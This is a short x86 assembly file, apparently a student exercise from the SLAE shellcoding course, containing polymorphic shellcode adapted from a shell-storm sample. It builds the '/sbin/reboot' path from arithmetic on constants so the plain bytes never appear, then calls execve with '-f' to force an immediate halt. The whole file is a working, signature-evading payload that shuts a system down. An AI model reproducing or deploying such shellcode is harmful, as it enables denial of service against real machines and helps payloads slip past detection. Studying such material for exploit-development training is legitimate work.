; Student:   SLAE-755
; Polymorphic reboot shellcode
; shell-storm.org/shellcode/files/shellcode-831.php

global _start			

section .text

_start:
	xor	 eax,eax
	push	 eax
	
	;toober/nibs/
	
	;push	dword 0x746f6f62
	mov edi, 0x62384e51
	add edi, 0x12382111
	push edi

	;push	dword 0x65722f6e
	mov	edi, 0x41511e3c
	add	edi, 0x24211132
	push	edi
	

	;push	dword 0x6962732f
	mov edi, 0x3651511a
	add edi, 0x33112215
	push edi


	mov	ebx,esp
	push	eax

	;-f Force immediate halt
	push	word 0x662d

	mov	esi,esp
	push	eax
	push	esi
	push	ebx
	mov	ecx,esp

	;#define __NR_execve 11 syscall
	mov	 al,0xb
	int	 0x80
